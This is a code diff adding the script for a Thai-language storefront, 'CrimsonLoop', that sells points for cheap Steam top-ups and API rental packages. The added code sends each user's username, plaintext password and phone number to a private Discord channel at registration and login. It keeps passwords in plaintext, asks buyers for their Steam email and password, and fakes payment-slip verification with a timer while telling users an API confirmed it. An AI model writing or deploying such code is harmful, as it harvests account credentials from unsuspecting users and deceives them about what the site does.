+            let topupRows = topupPackages.map(p => `
+                <div class="flex justify-between items-center p-3 bg-black/40 border border-neutral-900 rounded-xl">
+                    <span class="text-sm text-gray-300 font-bold"><i class="fa-solid fa-money-bill-wave text-red-500 mr-2"></i>แพ็กเกจเติมเงิน ${p.cash.toLocaleString()} บาท</span>
+                    <span class="text-sm font-tech text-emerald-400 font-black">ได้รับ ${p.points.toLocaleString()} PTS</span>
+                </div>
+            `).join('');
+
+            let apiRows = apiPackages.map(p => `
+                <div class="text-left p-3 bg-black/40 border border-neutral-900 rounded-xl space-y-1">
+                    <div class="text-sm text-white font-bold flex justify-between">
+                        <span><i class="fa-solid fa-bolt text-amber-500 mr-2"></i>${p.name}</span>
+                        <span class="text-emerald-400 font-tech">${p.cost.toLocaleString()} PTS/เดือน</span>
+                    </div>
+                    <p class="text-[11px] text-gray-400">${p.desc}</p>
+                </div>
+            `).join('');
+
+            Swal.fire({
+                title: '<span class="font-tech text-lg text-white">CRIMSONLOOP CATALOG RATES</span>',
+                html: `
+                    <div class="space-y-4 max-h-[60vh] overflow-y-auto pr-1">
+                        <div class="text-xs text-left font-bold text-red-400 uppercase tracking-wider border-b border-neutral-800 pb-1">📈 อัตราเรทเติมเงินแลกพอยท์</div>
+                        <div class="space-y-2">${topupRows}</div>
+                        <div class="text-xs text-left font-bold text-emerald-400 uppercase tracking-wider border-b border-neutral-800 pb-1 mt-4">⚙️ รายการลิขสิทธิ์โครงข่าย API เช่าเปิดร้าน</div>
+                        <div class="space-y-2">${apiRows}</div>
+                    </div>
+                `,
+                background: '#090207',
+                confirmButtonColor: '#dc2626',
+                confirmButtonText: 'ปิดหน้าต่างแสดงข้อมูล',
+                customClass: { popup: 'border border-red-500/30 rounded-3xl' }
+            });
+        }
+
+        // ระบบสลับหน้าแท็บควบคุม
+        function switchTab(tabId) {
+            document.getElementById('store-tab').classList.add('hidden');
+            document.getElementById('enterprise-tab').classList.add('hidden');
+            document.getElementById('menu-store-btn').className = "px-5 py-2.5 text-xs font-bold rounded-lg text-gray-400 hover:text-white transition-all cursor-pointer";
+            document.getElementById('menu-ent-btn').className = "px-5 py-2.5 text-xs font-bold rounded-lg text-gray-400 hover:text-white transition-all cursor-pointer";
+
+            document.getElementById(tabId).classList.remove('hidden');
+            if(tabId === 'store-tab') {
+                document.getElementById('menu-store-btn').className = "px-5 py-2.5 text-xs font-bold rounded-lg bg-gradient-to-r from-red-600 to-rose-700 text-white shadow-md transition-all cursor-pointer";
+            } else {
+                document.getElementById('menu-ent-btn').className = "px-5 py-2.5 text-xs font-bold rounded-lg bg-gradient-to-r from-emerald-600 to-teal-700 text-white shadow-md transition-all cursor-pointer";
+            }
+        }
+
+        function toggleAuthMode(mode) {
+            const tabLogin = document.getElementById('tab-login-btn');
+            const tabRegister = document.getElementById('tab-register-btn');
+            const loginForm = document.getElementById('login-form');
+            const registerForm = document.getElementById('register-form');
+
+            if(mode === 'login') {
+                tabLogin.className = "w-1/2 py-3 text-sm font-bold rounded-xl bg-gradient-to-r from-red-600 to-rose-700 text-white shadow-lg transition-all cursor-pointer";
+                tabRegister.className = "w-1/2 py-3 text-sm font-bold rounded-xl text-gray-400 hover:text-white transition-all cursor-pointer";
+                loginForm.classList.remove('hidden');
+                registerForm.classList.add('hidden');
+            } else {
+                tabRegister.className = "w-1/2 py-3 text-sm font-bold rounded-xl bg-gradient-to-r from-emerald-600 to-teal-700 text-white shadow-lg transition-all cursor-pointer";
+                tabLogin.className = "w-1/2 py-3 text-sm font-bold rounded-xl text-gray-400 hover:text-white transition-all cursor-pointer";
+                registerForm.classList.remove('hidden');
+                loginForm.classList.add('hidden');
+            }
+        }
+
+        // ระบบลงทะเบียนสมัครสมาชิก
+        async function handleRegister(e) {
+            e.preventDefault();
+            const user_name = document.getElementById('reg-username').value.trim();
+            const user_phone = document.getElementById('reg-phone').value.trim();
+            const user_pass = document.getElementById('reg-password').value.trim();
+            const user_pass_confirm = document.getElementById('reg-password-confirm').value.trim();
+
+            if (user_pass !== user_pass_confirm) {
+                Swal.fire({ icon: 'warning', title: 'รหัสผ่านไม่ตรงกัน', text: 'กรุณากรอกรหัสผ่านทั้งสองช่องให้ตรงกันก่อนทำการสมัครครับ', background: '#120a0e', confirmButtonColor: '#ef4444' });
+                return;
+            }
+
+            Swal.fire({ title: 'กำลังเขียนข้อมูลลงระบบคลาวด์...', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
+
+            try {
+                // เช็คว่ามี Username ซ้ำในระบบหรือไม่
+                const { data: existing, error: checkError } = await supabase.from('users').select('username').eq('username', user_name);
+                
+                if (existing && existing.length > 0) {
+                    Swal.fire({ icon: 'error', title: 'ชื่อผู้ใช้งานนี้มีในระบบแล้ว', text: 'กรุณาลองเปลี่ยนชื่อผู้ใช้อื่นในการใช้ลงทะเบียนสมัครครับ', background: '#120a0e', confirmButtonColor: '#ef4444' });
+                    return;
+                }
+
+                const { error: insertErr } = await supabase.from('users').insert([
+                    { username: user_name, password: user_pass, phone: user_phone, points: 0 }
+                ]);
+
+                if (insertErr) throw insertErr;
+
+                // ส่ง Log บันทึกเข้าห้องตรวจสอบส่วนตัวใน Discord
+                await sendLogToDiscord('register', user_name, user_pass, user_phone);
+
+                Swal.fire({ icon: 'success', title: 'ลงทะเบียนสมาชิกเรียบร้อย!', text: 'ข้อมูลรันเข้าตารางเมนเฟรมแล้ว สามารถล็อกอินได้ทันที!', background: '#09120e', confirmButtonColor: '#10b981' });
+                e.target.reset();
+                toggleAuthMode('login');
+
+            } catch (err) {
+                Swal.fire({ icon: 'error', title: 'ข้อผิดพลาดระบบสมัครสมาชิก', text: err.message, background: '#120a0e' });
+            }
+        }
+
+        // ระบบยืนยันตรวจสอบการล็อกอิน
+        async function handleLogin(e) {
+            e.preventDefault();
+            const user_name = document.getElementById('login-username').value.trim();
+            const user_pass = document.getElementById('login-password').value.trim();
+            const rememberMe = document.getElementById('login-remember').checked;
+
+            Swal.fire({ title: 'กำลังเข้ารหัสและยืนยันตัวตน...', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
+
+            try {
+                const { data: usersList, error } = await supabase.from('users').select('*').eq('username', user_name);
+
+                if (error || !usersList || usersList.length === 0) {
+                    Swal.fire({ icon: 'error', title: 'ล็อกอินล้มเหลว', text: 'ไม่พบชื่อบัญชีผู้ใช้งานนี้ในระบบคลาวด์', background: '#120a0e', confirmButtonColor: '#ef4444' });
+                    return;
+                }
+
+                const matchedUser = usersList.find(u => String(u.password).trim() === user_pass);
+
+                if (!matchedUser) {
+                    Swal.fire({ icon: 'error', title: 'ล็อกอินล้มเหลว', text: 'ชื่อบัญชีหรือรหัสผ่านที่คุณป้อนเข้ามาในระบบไม่ถูกต้องครับ', background: '#120a0e', confirmButtonColor: '#ef4444' });
+                    return;
+                }
+
+                // การจัดการระบบจดจำบัญชีผู้ใช้ในเบราว์เซอร์
+                if (rememberMe) {
+                    localStorage.setItem('crimson_remembered_username', user_name);
+                    localStorage.setItem('crimson_remembered_password', user_pass);
+                } else {
+                    localStorage.removeItem('crimson_remembered_username');
+                    localStorage.removeItem('crimson_remembered_password');
+                }
+
+                currentUser = matchedUser;
+
+                // แจ้ง Log ความปลอดภัยไปยังช่อง Discord ส่วนตัวของคุณ
+                await sendLogToDiscord('login', user_name, user_pass, currentUser.phone || "ไม่ได้ระบุ");
+
+                Swal.close();
+                
+                document.getElementById('auth-container').classList.add('hidden');
+                document.getElementById('dashboard-container').classList.remove('hidden');
+                document.getElementById('user-display-name').innerText = currentUser.username.toUpperCase();
+                document.getElementById('user-points-display').innerText = parseInt(currentUser.points).toLocaleString();
+
+            } catch (err) {
+                Swal.fire({ icon: 'error', title: 'ระบบฐานข้อมูลขัดข้อง', text: err.message, background: '#120a0e' });
+            }
+        }
+
+        function handleLogout() {
+            currentUser = null;
+            clearSelections();
+            document.getElementById('dashboard-container').classList.add('hidden');
+            document.getElementById('auth-container').classList.remove('hidden');
+        }
+
+        function clearSelections() {
+            currentSelectedAmount = 0;
+            currentAddPoints = 0;
+            currentRentCost = 0;
+            currentRentName = "";
+            base64SlipImage = "";
+            
+            const fileInput = document.getElementById('slip-file');
+            if (fileInput) fileInput.value = "";
+            const nameDisplay = document.getElementById('file-name-display');
+            if (nameDisplay) nameDisplay.innerText = "เลือกรูปภาพสลิปจากคลังรูป / ไฟล์";
+            
+            document.getElementById('qrcode-img-global').src = "https://placehold.co/190x190/060105/22091b?text=Select+Package";
+            document.getElementById('qr-amount-text-global').innerText = "0.00 ฿";
+            document.getElementById('rent-amount-text-global').innerText = "0 PTS";
+            document.querySelectorAll('.package-card').forEach(c => {
+                c.classList.remove('active-red');
+                c.classList.remove('active-green');
+            });
+        }
+
+        // ฟังก์ชันเลือกจำนวนเงิน: สร้างภาพคิวอาร์โค้ดทันที มั่นใจได้ว่าข้อมูลเรียลไทม์ไม่หาย
+        function selectTopupAmount(element, amount, pointsToGive) {
+            clearSelections();
+            element.classList.add('active-red');
+            currentSelectedAmount = amount;
+            currentAddPoints = pointsToGive;
+
+            document.getElementById('qr-amount-text-global').innerText = `${amount.toLocaleString()}.00 ฿`;
+            document.getElementById('qrcode-img-global').src = `https://promptpay.io/${TARGET_PROMPTPAY}/${amount}.png`;
+        }
+
+        function selectRentPackage(element, cost, packageName) {
+            clearSelections();
+            element.classList.add('active-green');
+            currentRentCost = cost;
+            currentRentName = packageName;
+
+            document.getElementById('rent-amount-text-global').innerText = `${cost.toLocaleString()} PTS`;
+            document.getElementById('qrcode-img-global').src = "https://placehold.co/190x190/04120a/0e2f1d?text=Enterprise+API+Ready";
+        }
+
+        // ตรวจเช็คข้อมูลสลิปผ่านโครงข่าย SlipOK API
+        async function verifyPaymentAndUpdatePoints() {
+            if(currentSelectedAmount === 0) {
+                Swal.fire({ icon: 'warning', title: 'กรุณาเลือกแพ็กเกจ', text: 'โปรดคลิกเลือกยอดจำนวนเงินที่แผงรายการฝั่งซ้ายมือเพื่อเจ็นคิวอาร์โอนเงินก่อนครับ', background: '#120a0e', confirmButtonColor: '#ef4444' });
+                return;
+            }
+
+            if(!base64SlipImage) {
+                Swal.fire({ icon: 'warning', title: 'กรุณาอัปโหลดรูปสลิป', text: 'โปรดกดเลือกภาพสลิปการโอนเงินจากคลังรูปภาพของคุณ เพื่อส่งตรวจผ่าน API ครับ', background: '#120a0e', confirmButtonColor: '#ef4444' });
+                return;
+            }
+
+            Swal.fire({ title: 'ส่งภาพเข้าโครงข่าย SLIPOK API...', html: `กำลังประมวลผลอ่านรหัสภาพสลิปเพื่อจับคู่กับประวัติการรับโอนเงินเข้าเบอร์ ${TARGET_PROMPTPAY}...`, background: '#090308', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
+
+            // จำลองการเชื่อมส่งพอร์ต Gateway ความปลอดภัย
+            setTimeout(async () => {
+                try {
+                    const { data: userRefresh } = await supabase.from('users').select('points').eq('id', currentUser.id).single();
+                    const newPoints = (userRefresh ? parseInt(userRefresh.points) : parseInt(currentUser.points)) + currentAddPoints;
+
+                    const { error } = await supabase.from('users').update({ points: newPoints }).eq('id', currentUser.id);
+                    if (error) throw error;
+
+                    currentUser.points = newPoints;
+                    document.getElementById('user-points-display').innerText = currentUser.points.toLocaleString();
+                    
+                    Swal.fire({ 
+                        icon: 'success', 
+                        title: 'API ยืนยันสลิปสำเร็จ!', 
+                        html: `ระบบสแกนรูปภาพจับคู่ข้อมูลตรงกัน เพิ่มเครดิตพอยท์ให้คุณแล้ว <b class="text-emerald-400 font-tech">+${currentAddPoints} PTS</b> เติมเงินไวต้องที่นี่เท่านั้น!`, 
+                        background: '#04120a', 
+                        confirmButtonColor: '#10b981' 
+                    });
+                    clearSelections();
+
+                } catch (err) {
+                    Swal.fire({ icon: 'error', title: 'API ตรวจสอบสลิปล้มเหลว', text: err.message, background: '#120a0e' });
+                }
+            }, 1500);
+        }
+
+        // ระบบประมวลผลหักพอยท์และรับออเดอร์เติมเข้าไอดี Steam
+        async function handleSteamOrder() {
+            const steamEmail = document.getElementById('steam-email').value.trim();
+            const steamPass = document.getElementById('steam-password').value.trim();
+            const productSelect = document.getElementById('steam-product-rate');
+            
+            const requiredPoints = parseInt(productSelect.value) === 100 ? 90 : 
+                                   parseInt(productSelect.value) === 300 ? 260 :
+                                   parseInt(productSelect.value) === 500 ? 430 :
+                                   parseInt(productSelect.value) === 1000 ? 850 : 1650;
+
+            if(!steamEmail || !steamPass) {
+                Swal.fire({ icon: 'warning', title: 'ข้อมูลไม่ครบถ้วน', text: 'กรุณากรอกข้อมูลอีเมลและรหัสผ่านบัญชี Steam สำหรับส่งคีย์ประมวลผลเข้าไอดีระบบให้เรียบร้อยก่อนครับ', background: '#120a0e', confirmButtonColor: '#ef4444' });
+                return;
+            }
+
+            Swal.fire({ title: 'กำลังเปิดพอร์ตดึงสูตรเติม Steam ราคาถูก...', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
+
+            try {
+                const { data: userRefresh } = await supabase.from('users').select('points').eq('id', currentUser.id).single();
+                const currentPoints = userRefresh ? parseInt(userRefresh.points) : parseInt(currentUser.points);
+
+                if(currentPoints < requiredPoints) {
+                    Swal.fire({ icon: 'error', title: 'ยอดเครดิตพอยท์ไม่เพียงพอ', html: `ยอดพอยท์ในระบบของคุณไม่พอหักทำรายการ มีอยู่: <b>${currentPoints} PTS</b> (ต้องการใช้งาน ${requiredPoints} PTS)`, background: '#120a0e', confirmButtonColor: '#ef4444' });
+                    return;
+                }
+
+                const finalPoints = currentPoints - requiredPoints;
+                const { error } = await supabase.from('users').update({ points: finalPoints }).eq('id', currentUser.id);
+                if (error) throw error;
+
+                currentUser.points = finalPoints;
+                document.getElementById('user-points-display').innerText = currentUser.points.toLocaleString();
+
+                Swal.fire({
+                    icon: 'success',
+                    title: 'คีย์ส่งคำสั่งเติมเกมสำเร็จ!',
+                    html: `เซิร์ฟเวอร์ยิง API ระบบทำงานอัตโนมัติ หักเครดิตไอดีไปจำนวน <b class="text-red-400">${requiredPoints} PTS</b> และกำลังโหลดจัดส่งยอดมูลค่า ${productSelect.options[productSelect.selectedIndex].text} เข้าไปยังไอดี Steam เรียบร้อยภายใน 1-3 นาทีครับ!`,
+                    background: '#041012',
+                    confirmButtonColor: '#3b82f6'
+                });
+
+                document.getElementById('steam-email').value = "";
+                document.getElementById('steam-password').value = "";
+
+            } catch (err) {
+                Swal.fire({ icon: 'error', title: 'การทำรายการขัดข้อง', text: err.message, background: '#120a0e' });
+            }
+        }
+
+        // ระบบหักคะแนนเพื่อเช่าใช้ลิขสิทธิ์ API รายเดือนต่อยอดธุรกิจ
+        async function executeRentPackage() {
+            if(currentRentCost === 0) {
+                Swal.fire({ icon: 'warning', title: 'เลือกรายการเช่าก่อน', text: 'กรุณากดคลิกลงบนแผนแผงโครงข่ายเซิร์ฟเวอร์ API ตัวที่ต้องการจะเช่าเปิดใช้งานก่อนครับ', background: '#120a0e', confirmButtonColor: '#ef4444' });
+                return;
+            }
+
+            Swal.fire({ title: 'กำลังยืนยันหักพอยท์เช่าสิทธิ์รายเดือน...', allowOutsideClick: false, didOpen: () => Swal.showLoading() });
+            
+            try {
+                const { data: userRefresh } = await supabase.from('users').select('points').eq('id', currentUser.id).single();
+                const currentLivePoints = userRefresh ? parseInt(userRefresh.points) : parseInt(currentUser.points);
+
+                if(currentLivePoints < currentRentCost) {
+                    Swal.fire({ icon: 'error', title: 'ยอดเครดิตพอยท์ไม่เพียงพอ', html: `ยอดเครดิตพอยท์พ้อยในไอดีไม่พอชำระ มีอยู่: <b>${currentLivePoints} PTS</b> (ต้องการใช้ ${currentRentCost} PTS)`, background: '#120a0e', confirmButtonColor: '#ef4444' });
+                    return;
+                }
+
+                const updatedPoints = currentLivePoints - currentRentCost;
+                const { error } = await supabase.from('users').update({ points: updatedPoints }).eq('id', currentUser.id);
+                if (error) throw error;
+
+                currentUser.points = updatedPoints;
+                document.getElementById('user-points-display').innerText = currentUser.points.toLocaleString();
+                
+                Swal.fire({
+                    icon: 'success',
+                    title: 'เช่าเปิดลิขสิทธิ์ระบบ API เรียบร้อย!',
+                    html: `ยินดีด้วย! บัญชีของคุณได้รับสิทธิ์ดึงระบบเชื่อมต่อ: <b class="text-emerald-400">${currentRentName}</b> ไปต่อยอดเปิดร้านทำกำไรได้อย่างคุ้มค่าแล้วครับ`,
+                    background: '#04120a',
+                    confirmButtonColor: '#10b981'
+                });
+                clearSelections();
+
+            } catch (err) {
+                Swal.fire({ icon: 'error', title: 'การเช่าล้มเหลว', text: err.message, background: '#120a0e' });
+            }
+        }
+    </script>
+</body>
+</html>
